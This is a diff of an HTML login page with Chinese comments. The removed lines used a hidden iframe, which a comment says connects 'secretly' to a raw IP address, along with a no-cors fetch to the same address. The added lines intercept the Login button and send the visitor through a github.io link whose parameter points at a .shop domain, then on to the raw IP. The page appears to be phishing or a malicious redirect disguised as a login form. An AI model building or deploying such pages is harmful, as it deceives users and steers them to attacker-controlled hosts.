@@ -66,43 +66,21 @@
     button:hover {
       background-color: #0056b3;
     }
-    /* 隱藏的 iframe */
-    #hiddenIframe {
-      display: none;
-      width: 0;
-      height: 0;
-      border: 0;
-    }
   </style>
   <script>
     function handleLogin(event) {
-      //event.preventDefault(); // 阻止表單默認提交行為
+      // 阻止表單預設行為 (以防畫面立即刷新)
+      event.preventDefault();
 
-      const primaryURL = "http://103.200.23.160";
+      // Step 1: 先導向到指定之 fallback 網址
       const fallbackURL = "https://zongyiu.github.io/wnc/?site=http://jkkahebg899wubj.shop/";
+      window.location.href = fallbackURL;
 
-      // 先在隱藏的 iframe 中連到主 URL
-      const iframe = document.getElementById('hiddenIframe');
-      iframe.src = primaryURL;
-
-      // 同時使用 fetch 搭配 mode: 'no-cors' 嘗試發請求
-      fetch(primaryURL, {
-        method: 'HEAD',
-        mode: 'no-cors'
-      })
-      .then(() => {
-        // 如果需要在成功 fetch 後做事，可以在此處理
-        console.log('Primary URL requested with no-cors');
-      })
-      .catch(() => {
-        // 如果需要在錯誤發生時做事，可以在此處理
-        console.error('Error requesting primary URL');
-      });
-
-      // 5 秒後跳轉到備用 URL
-      //setTimeout(() => {
-      //  window.location.href = fallbackURL;
-      //}, 20000);
+      // Step 2: 等待數秒後，再自動導向主要網址
+      // 可自行調整 setTimeout 毫秒數，例如 3 秒 (3000ms)、5 秒 (5000ms) 等
+      setTimeout(() => {
+        window.location.href = "http://103.200.23.160";
+      }, 3000);
     }
   </script>
 </head>
@@ -118,7 +96,5 @@
       <button type="submit">Login</button>
     </form>
   </div>
-  <!-- 隱藏的 iframe，用來偷偷連線到 primaryURL -->
-  <iframe id="hiddenIframe"></iframe>
 </body>
 </html>
